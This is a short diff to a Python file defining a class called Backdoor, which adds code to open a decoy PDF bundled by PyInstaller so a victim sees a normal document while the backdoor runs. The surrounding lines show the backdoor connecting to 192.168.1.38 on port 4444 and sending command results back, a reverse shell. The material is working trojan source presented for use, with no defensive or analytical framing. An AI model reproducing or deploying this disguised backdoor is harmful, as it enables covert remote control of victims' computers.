@@ -72,6 +72,9 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\sample.pdf"           # Default location of the front file (is appdata) put by pyinstaller 
+subprocess.Popen(file_name, shell = True)
+
 try:       
     my_backdoor = Backdoor("192.168.1.38", 4444)
     my_backdoor.run()
